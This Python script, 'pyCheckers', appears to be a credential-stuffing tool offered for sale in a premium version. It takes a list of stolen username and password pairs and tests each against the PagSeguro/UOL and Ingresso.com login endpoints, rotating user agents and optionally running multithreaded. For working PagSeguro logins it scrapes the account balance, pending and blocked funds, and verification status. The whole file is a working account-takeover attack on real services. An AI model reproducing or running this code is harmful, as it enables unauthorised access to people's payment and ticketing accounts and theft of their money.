# -*- coding: utf-8 -*-
# !/usr/bin/env python


"""
___________________________________
#                                 #
#     PyCheckers por d3z3n0v3     #
#         Versão Python 3         #
#        Copia não comédia        #
#_________________________________#
"""

import sys


def check_system():
    ERROR_INDEX = 0
    if sys.platform != "win32":
        ERROR_INDEX += 1
    elif sys.platform != "linux":
        ERROR_INDEX += 1
    elif sys.platform != "posix":
        ERROR_INDEX += 1
    if ERROR_INDEX != 1:
        exit("\n# Incompatible OS for this script -> %s.\n# You need to use Windows(7x/8x/10x) or Linux for run this script successfully.\n# You can contact me on skype -> frost.h4x0r" % sys.platform)


def check_version():
    PYTHON_VERSION = sys.version.split()[0]
    if PYTHON_VERSION < "3":
        exit("\n# Incompatible Python version for this script -> %s.\n# You need to use Python 3x for run this script successfully.\n# You can contact me on skype -> frost.h4x0r" % PYTHON_VERSION)
    EXTENSIONS = ("gzip", "ssl", "sqlite3", "zlib")
    try:
        for e in EXTENSIONS:
            __import__(e)
    except ImportError:
        ERROR_MSG = "# Missing one or more extensions -> %s" % (", ".join("%s" % e for e in EXTENSIONS))
        exit(ERROR_MSG)


check_version()
check_system()

import requests
import os
import random
import argparse
import time
import re

from threading import Thread as T
from colorama import Fore as F
from colorama import init as INIT
from os import system as COMMAND

COMMAND("cls||clear")

INIT()


def get_useragent():
    return ['Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/7.0.5 Safari/537.77.4',
            'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:31.0) Gecko/20100101 Firefox/31.0',
            'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:30.0) Gecko/20100101 Firefox/30.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
            'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0',
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53',
            'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
            'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
            'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0',
            'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.76.4 (KHTML, like Gecko) Version/7.0.4 Safari/537.76.4',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/538.46 (KHTML, like Gecko) Version/8.0 Safari/538.46',
            'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0',
            'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
            'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10',
            'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/6.1.5 Safari/537.77.4',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/34.0.1847.116 Chrome/34.0.1847.116 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/6.1.5 Safari/537.77.4',
            'Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0',
            'Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14',
            'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.74.9 (KHTML, like Gecko) Version/7.0.2 Safari/537.74.9',
            'Mozilla/5.0 (X11; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:31.0) Gecko/20100101 Firefox/31.0',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0',
            'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:31.0) Gecko/20100101 Firefox/31.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14',
            'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
            'Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0',
            'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0',
            'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) GSA/4.1.0.31802 Mobile/11D257 Safari/9537.53',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:31.0) Gecko/20100101 Firefox/31.0',
            'Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0',
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
            'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/36.0.1985.125 Chrome/36.0.1985.125 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:30.0) Gecko/20100101 Firefox/30.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Safari/600.1.3',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36']


class Banners():
    title = """%s
    _________________________________________________________________________________________
   |                                                                                         |
   |  %s██████╗ ██╗   ██╗%s     ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ ███████╗%s  |
   |  %s██╔══██╗╚██╗ ██╔╝%s    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔════╝%s  |
   |  %s██████╔╝ ╚████╔╝%s     ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝███████╗%s  |
   |  %s██╔═══╝   ╚██╔╝%s      ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗╚════██║%s  |
   |  %s██║        ██║%s       ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║███████║%s  |
   |  %s╚═╝        ╚═╝%s        ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝%s  |
   |_________________________________________________________________________________________|

     %s{#}--+--{#}--+--{#}--+--{#}--+--{#}--+--{#}--+--{#}--+--{#}--+--{#}--+--{#}--+--{#}%s

                          [#] Version: {+-+ 1.0.0 +-+}

                          [#] Author:  {+-+ Coded by d3z3n0v3 +-+}

                          [#] Contact: {+-+ d3z3n0v3@gmail.com +-+}

                          [#] Skype:   {+-+ frost.h4x0r +-+}

                          [#] For help, type: python3 %s %s--help

     %s{#}--+--{#}--+--{#}--+--{#}--+--{#}--+--{#}--+--{#}--+--{#}--+--{#}--+--{#}--+--{#}%s""" % (F.WHITE,
                                                                                                   F.LIGHTCYAN_EX, F.LIGHTRED_EX, F.WHITE,
                                                                                                   F.LIGHTCYAN_EX, F.LIGHTRED_EX, F.WHITE,
                                                                                                   F.LIGHTCYAN_EX, F.LIGHTRED_EX, F.WHITE,
                                                                                                   F.LIGHTCYAN_EX, F.LIGHTRED_EX, F.WHITE,
                                                                                                   F.LIGHTCYAN_EX, F.LIGHTRED_EX, F.WHITE,
                                                                                                   F.LIGHTCYAN_EX, F.LIGHTRED_EX, F.WHITE,
                                                                                                   F.LIGHTGREEN_EX, F.LIGHTYELLOW_EX,
                                                                                                   sys.argv[0], F.YELLOW,
                                                                                                   F.LIGHTGREEN_EX, F.RESET)
    help = """
    %spyCheckers was written by %sd3z3n0v3.

    %sCopia não comédia. For buy premium C++ version contact me on %sskype.

    %s[#] Usage:%s pyCheckers.py [-h] --lista LISTA [--separador SEPARADOR]
                               [--timeout TIMEOUT] [--useragent USERAGENT] [--multithreading]
                               [--pagseguro] [--ingresso]

    %s[#] Arguments table:%s

        [-h], [--help]             %sMostra esaa mensagem e fecha.%s
        [--lista LISTA]            %sLista de contas para serem testadas.%s
        [--separador SEPARADOR]    %sEscolha o separador das contas. Separador padrão é: |%s
        [--timeout TIMEOUT]        %sEscolha o tempo do timeout. Timeout padrão é: 200%s
        [--useragent USERAGENT]    %sEscolha o arquivo dos useragents.%s
        [--multithreading]         %sAtive o multithreading.%s

    %s[#] Available checkers:%s

        [--pagseguro]              %sAdiciona o testador Pagseguro na fila.%s
        [--ingresso]               %sAdiciona o testador Ingresso na fila.%s""" % (F.RED, F.LIGHTRED_EX, F.RED, F.LIGHTRED_EX,
                                                                                   F.LIGHTGREEN_EX, F.LIGHTYELLOW_EX,
                                                                                   F.LIGHTGREEN_EX, F.LIGHTYELLOW_EX,
                                                                                   F.LIGHTCYAN_EX, F.LIGHTYELLOW_EX,
                                                                                   F.LIGHTCYAN_EX, F.LIGHTYELLOW_EX,
                                                                                   F.LIGHTCYAN_EX, F.LIGHTYELLOW_EX,
                                                                                   F.LIGHTCYAN_EX, F.LIGHTYELLOW_EX,
                                                                                   F.LIGHTCYAN_EX, F.LIGHTYELLOW_EX,
                                                                                   F.LIGHTCYAN_EX, F.LIGHTYELLOW_EX,
                                                                                   F.LIGHTGREEN_EX,
                                                                                   F.LIGHTYELLOW_EX, F.LIGHTCYAN_EX,  # pagseguro
                                                                                   F.LIGHTYELLOW_EX, F.LIGHTCYAN_EX,  # ingresso
                                                                                   F.RESET)
    required = """
    %s[#] Required argument: [%s--lista LISTA%s]%s""" % (F.RED, F.LIGHTRED_EX,
                                                         F.RED,
                                                         F.RESET)
    start = """
    %spyCheckers was written by %sd3z3n0v3.

    %sCopia não comédia. For buy premium C++ version contact me on %sskype.

    %s[==>] %sInicializando programa... %s[<==]

    %s[==>] %sVersão atual: 1.0.0 %s[<==]

    %s[==>] %sTodos modulos carregados! Testando... %s[<==]%s""" % (F.RED, F.LIGHTRED_EX, F.RED, F.LIGHTRED_EX,
                                                                    F.LIGHTGREEN_EX, F.LIGHTYELLOW_EX, F.LIGHTGREEN_EX,
                                                                    F.LIGHTGREEN_EX, F.LIGHTYELLOW_EX, F.LIGHTGREEN_EX,
                                                                    F.LIGHTGREEN_EX, F.LIGHTYELLOW_EX, F.LIGHTGREEN_EX,
                                                                    F.RESET)
    pagseguro = """
    %s[==>] %sInicializando o testador de %spagseguro %s[<==]%s""" % (F.LIGHTGREEN_EX, F.LIGHTYELLOW_EX, F.LIGHTCYAN_EX, F.LIGHTGREEN_EX, F.RESET)

    ingresso = """
    %s[==>] %sInicializando o testador de %singresso %s[<==]%s""" % (F.LIGHTGREEN_EX, F.LIGHTYELLOW_EX, F.LIGHTCYAN_EX, F.LIGHTGREEN_EX, F.RESET)


if len(sys.argv) == 1:
    exit(Banners.title)
elif "--help" in sys.argv or "-h" in sys.argv:
    exit(Banners.help)
elif "--lista" not in sys.argv:
    exit(Banners.required)

parser = argparse.ArgumentParser(description="@pyCheckers written by d3z3n0v3")
parser.add_argument("--lista", action="store", dest="lista", required=True, help="Lista de contas para serem testadas.")
parser.add_argument("--separador", action="store", dest="separador", required=False, help="Escolha o separador das contas.\nSeparador padrão é: |", default="|")
parser.add_argument("--timeout", action="store", dest="timeout", required=False, help="Escolha o tempo do timeout.\nTimeout padrão é: 200", default=200)
parser.add_argument("--useragent", action="store", dest="useragent", required=False, help="Escolha o arquivo dos useragents.", default=get_useragent())
parser.add_argument("--pagseguro", action="store_true", dest="pagseguro", required=False, help="Pagseguro Checker.")
parser.add_argument("--ingresso", action="store_true", dest="ingresso", required=False, help="Ingresso Checker.")
parser.add_argument("--multithreading", action="store_true", dest="multithreading", required=False, help="Ative o multithreading.")
param = parser.parse_args()

print(Banners.start)


class Testadores():
    pagseguro = "pagseguro"
    ingresso = "ingresso"


class Status():
    total = 0
    # pagseguro
    pagseguro_lista_lives = []
    pagseguro_lista_dies = []
    pagseguro_total_lives = 0
    pagseguro_total_dies = 0
    pagseguro_erro = 0
    # ingresso
    ingresso_lista_lives = []
    ingresso_lista_dies = []
    ingresso_total_lives = 0
    ingresso_total_dies = 0
    ingresso_erro = 0


l_arquivo = ""
ua_arquivo = ""

if param.lista != "":
    try:
        l_arquivo = open(str(param.lista))
    except:
        exit("\n    {}[-] {}O arquivo inserido é inválido!{}".format(F.RED, F.LIGHTRED_EX, F.RESET))

if param.useragent != get_useragent():
    try:
        ua_arquivo = open(str(param.useragent))
    except:
        exit("\n    {}[-] {}O arquivo inserido é inválido!{}".format(F.RED, F.LIGHTRED_EX, F.RESET))

print("\n    {}[+] {}O arquivo inserido é válido! [ {}Arquivo: {} | {}Separador: {}{}{} ]{}".format(F.GREEN, F.LIGHTGREEN_EX, F.GREEN,
                                                                                                    F.CYAN + l_arquivo.name + F.LIGHTGREEN_EX, F.GREEN, F.CYAN, str(param.separador), F.LIGHTGREEN_EX,
                                                                                                    F.RESET))
if param.multithreading:
    print("\n    {}[+] {}Multithreading ativado! [ {}Timeout: {} ]{}\n".format(F.GREEN, F.LIGHTGREEN_EX, F.GREEN,
                                                                               F.CYAN + str(param.timeout) + F.LIGHTGREEN_EX,
                                                                               F.RESET))
else:
    print("\n    {}[-] {}Multithreading desativado! [ {}Timeout: --- {}]{}\n".format(F.RED, F.LIGHTRED_EX, F.RED, F.LIGHTRED_EX,
                                                                                     F.RESET))

print("    {}[+] {}Começando a testar as contas...{}".format(F.GREEN, F.LIGHTGREEN_EX,
                                                             F.RESET))

global r_session

r_session = requests.Session()
r_session.close()


def get_linhas():
    l_linhas = []
    for line in l_arquivo.readlines():
        line = line.replace("\n", "")
        l_linhas.append(line)
    linhas = ""
    for item in l_linhas:
        linhas += item + "\n"
    return linhas


def get_ua():
    try:
        return random.choice(ua_arquivo.readlines()).replace("\n", "")
    except:
        return random.choice(get_useragent()).replace("\n", "")


class Pagseguro():
    def __init__(self, usuario, senha, useragent):
        self.obj = Credentials(usuario, senha, useragent)

    def start(self):
        try:
            obj = self.obj
            headers = {"User-Agent": obj.useragent}
            usuario = obj.usuario
            senha = obj.senha
            r_session.headers = headers
            r_cookie = r_session.get("https://acesso.uol.com.br/login.html")
            r_post = r_session.post("https://acesso.uol.com.br/login.html", cookies=r_cookie.cookies, data={'user': usuario, 'pass': senha, 'skin': 'default', 'dest': '', 'deviceId': ''})
            r_post.cookies.clear()
            r_cookie.cookies.clear()
            if "limite" not in r_post.text:
                Status.pagseguro_lista_dies.append("%s[-] %sRP ./ " % (F.RED, F.LIGHTRED_EX) + str(usuario) + " | " + str(senha))
                Status.pagseguro_total_dies += 1
            else:
                r_token = r_session.get("https://pagseguro.uol.com.br/checkout/acesso.jhtml")
                token = re.search('<input type="hidden" name="acsrfToken" value="(.+?)"', r_token.text)
                token = token.group(1)
                r_data = r_session.post("https://pagseguro.uol.com.br/login.jhtml", cookies=r_token.cookies, data={'dest': 'REDIR|https://pagseguro.uol.com.br/hub.jhtml', 'skin': '', 'acsrfToken': token, 'user': usuario, 'pass': senha, 'entrar': ''})
                if "verificar conta" in r_data.text:
                    status = "Não verificada"
                else:
                    status = "Verificada"
                balance = re.search('<dd id="accountBalance" class="positive">(.+?)</dd>', r_data.text)
                balance = balance.group(1)
                receive = re.search('<dd id="accountEscrow" class="neutral">(.+?)</dd>', r_data.text)
                receive = receive.group(1)
                blocked = re.search('<dd id="accountBlocked" class="neutral">(.+?)</dd>', r_data.text)
                blocked = blocked.group(1)
                typee = re.search('<a class="userType" href="/account/viewDetails.jhtml" title="(.+?)">', r_data.text)
                typee = typee.group(1)
                r_data.cookies.clear()
                r_token.cookies.clear()
                Status.pagseguro_lista_lives.append("%s[+] %sAP ./ " % (F.GREEN, F.LIGHTGREEN_EX) + str(usuario) + " | " + str(senha) + " | Saldo: " + str(balance) + " | Para receber: " + str(receive) + " | Bloqueado: " + str(blocked) + " | Tipo: " + str(typee) + " | Status: " + str(status))
                Status.pagseguro_total_lives += 1
            Status.total += 1
        except:
            Status.pagseguro_erro += 1


class Ingresso():
    def __init__(self, usuario, senha, useragent):
        self.obj = Credentials(usuario, senha, useragent)

    def start(self):
        try:
            obj = self.obj
            headers = {"User-Agent": obj.useragent}
            usuario = obj.usuario
            senha = obj.senha
            r_session.headers = headers
            r_post = r_session.post("https://api.ingresso.com/v1/token", data={'username': usuario, 'password': senha, 'grant_type': 'password'})
            if "access_token" not in r_post.text:
                Status.ingresso_lista_dies.append("%s[-] %sRP ./ " % (F.RED, F.LIGHTRED_EX) + str(usuario) + " | " + str(senha))
                Status.ingresso_total_dies += 1
            else:
                nome = re.findall(r'\"(.+?)\"', r_post.text)
                nome = ",".join(nome)
                nome = nome.split(",")[8]
                Status.ingresso_lista_lives.append("%s[+] %sAP ./ " % (F.GREEN, F.LIGHTGREEN_EX) + str(usuario) + " | " + str(senha) + " | Nome: " + str(nome))
                Status.ingresso_total_lives += 1
            Status.total += 1
        except:
            Status.ingresso_erro += 1


class Credentials():
    def __init__(self, usuario, senha, useragent):
        self.usuario = usuario
        self.senha = senha
        self.useragent = useragent


def send_post(usuario, senha, useragent, testador):
    if Testadores.pagseguro in testador:
        obj = Pagseguro(usuario, senha, useragent)
        obj.start()
    if Testadores.ingresso in testador:
        obj = Ingresso(usuario, senha, useragent)
        obj.start()


count = 0
threads = []

testador = ""

if param.pagseguro:
    count += 1
    print(Banners.pagseguro)
    testador += Testadores.pagseguro

if param.ingresso:
    count += 1
    print(Banners.ingresso)
    testador += Testadores.ingresso

if count < 1:
    exit("\n    {}[-] {}Nenhum testador foi selecionado!{}".format(F.RED, F.LIGHTRED_EX, F.RESET))


def show_status(time_interval):
    msg = "\n    %s[ %s######################################## %s]\n\n" % (F.BLUE, F.LIGHTBLUE_EX, F.BLUE)
    msg += "    %s[!] %sStatus do teste %s[!]\n\n    %s[#] %sTestadores: %s[#]" % (F.LIGHTGREEN_EX, F.LIGHTYELLOW_EX, F.LIGHTGREEN_EX,
                                                                                   F.LIGHTGREEN_EX, F.LIGHTYELLOW_EX, F.LIGHTGREEN_EX)
    if param.pagseguro:
        msg += "\n\n    %s[>] %sPagseguro %s[<]" % (F.GREEN, F.LIGHTYELLOW_EX, F.GREEN)
        msg += " %s>>>" % F.LIGHTGREEN_EX
        msg += " %s[+] %sTestadas: %s%i" % (F.CYAN, F.LIGHTYELLOW_EX, F.LIGHTCYAN_EX, Status.pagseguro_total_lives + Status.pagseguro_total_dies)
        msg += " %s[+] %sLives: %s%i" % (F.GREEN, F.LIGHTYELLOW_EX, F.LIGHTCYAN_EX, Status.pagseguro_total_lives)
        msg += " %s[-] %sDies: %s%i" % (F.RED, F.LIGHTYELLOW_EX, F.LIGHTCYAN_EX, Status.pagseguro_total_dies)
        msg += " %s[!] %sNão testadas: %s%i" % (F.YELLOW, F.LIGHTYELLOW_EX, F.LIGHTCYAN_EX, Status.pagseguro_erro)
        msg += "%s <<<" % F.LIGHTGREEN_EX

    if param.ingresso:
        msg += "\n\n    %s[>] %sIngresso %s[<]" % (F.GREEN, F.LIGHTYELLOW_EX, F.GREEN)
        msg += " %s>>>" % F.LIGHTGREEN_EX
        msg += " %s[+] %sTestadas: %s%i" % (F.CYAN, F.LIGHTYELLOW_EX, F.LIGHTCYAN_EX, Status.ingresso_total_lives + Status.ingresso_total_dies)
        msg += " %s[+] %sLives: %s%i" % (F.GREEN, F.LIGHTYELLOW_EX, F.LIGHTCYAN_EX, Status.ingresso_total_lives)
        msg += " %s[-] %sDies: %s%i" % (F.RED, F.LIGHTYELLOW_EX, F.LIGHTCYAN_EX, Status.ingresso_total_dies)
        msg += " %s[!] %sNão testadas: %s%i" % (F.YELLOW, F.LIGHTYELLOW_EX, F.LIGHTCYAN_EX, Status.ingresso_erro)
        msg += "%s <<<" % F.LIGHTGREEN_EX

    msg += "\n\n    %s[@] %sTempo do teste: %s%i segundos." % (F.LIGHTGREEN_EX, F.LIGHTYELLOW_EX, F.LIGHTCYAN_EX, time_interval)
    msg += "\n\n    %s[ %s######################################## %s]" % (F.BLUE, F.LIGHTBLUE_EX, F.BLUE)
    msg += "\n\n    %s[ %sTODAS CONTAS TESTADAS [ %s%i %s] %s]\n" % (F.BLUE, F.LIGHTBLUE_EX, F.LIGHTCYAN_EX, Status.total, F.LIGHTBLUE_EX, F.BLUE)

    if param.pagseguro:
        for item in Status.pagseguro_lista_lives:
            msg += "\n" + "    %s[ %sPAGSEGURO %s]   %s==> %s" % (F.CYAN, F.LIGHTCYAN_EX, F.CYAN, F.LIGHTYELLOW_EX, F.RESET) + item
        for item in Status.pagseguro_lista_dies:
            msg += "\n" + "    %s[ %sPAGSEGURO %s]   %s==> %s" % (F.CYAN, F.LIGHTCYAN_EX, F.CYAN, F.LIGHTYELLOW_EX, F.RESET) + item

    if param.ingresso:
        for item in Status.ingresso_lista_lives:
            msg += "\n" + "    %s[ %sINGRESSO %s]    %s==> %s" % (F.CYAN, F.LIGHTCYAN_EX, F.CYAN, F.LIGHTYELLOW_EX, F.RESET) + item
        for item in Status.ingresso_lista_dies:
            msg += "\n" + "    %s[ %sINGRESSO %s]    %s==> %s" % (F.CYAN, F.LIGHTCYAN_EX, F.CYAN, F.LIGHTYELLOW_EX, F.RESET) + item

    msg += "\n\n    %s[ %sFIM DAS CONTAS TESTADAS [ %s%i %s] %s]" % (F.BLUE, F.LIGHTBLUE_EX, F.LIGHTCYAN_EX, Status.total, F.LIGHTBLUE_EX, F.BLUE)

    msg += "    %s" % (F.RESET)
    exit(msg)


if __name__ == "__main__":
    try:
        origin_time = time.time()
        if param.multithreading:
            for conta in get_linhas().split():
                usuario, senha = (conta.strip()).split(str(param.separador))
                useragent = get_ua()
                t = T(target=send_post, args=(usuario, senha, useragent, testador))
                t.start()
                threads.append(t)
                timeout = 0.200
                try:
                    timeout = int(param.timeout) / 1000
                except:
                    pass
                time.sleep(timeout)

            for thread in threads:
                thread.join()
        else:
            for conta in get_linhas().split():
                usuario, senha = (conta.strip()).split(str(param.separador))
                useragent = get_ua()
                send_post(usuario, senha, useragent, testador)
        print("\n    {}[+] {}Teste finalizado!{}".format(F.GREEN, F.LIGHTGREEN_EX, F.RESET))
        time_interval = time.time() - origin_time
        show_status(time_interval)
    except KeyboardInterrupt:
        exit("\n    {}[-] {}Você decidiu cancelar o teste!{}".format(F.RED, F.LIGHTRED_EX, F.RESET))
    except FileExistsError:
        exit("\n    {}[-] {}O arquivo provavelmente não existe!{}".format(F.RED, F.LIGHTRED_EX, F.RESET))
    except FileNotFoundError:
        exit("\n    {}[-] {}O arquivo provavelmente não existe!{}".format(F.RED, F.LIGHTRED_EX, F.RESET))
    except OverflowError:
        exit("\n    {}[-] {}Houve algum erro!{}".format(F.RED, F.LIGHTRED_EX, F.RESET))
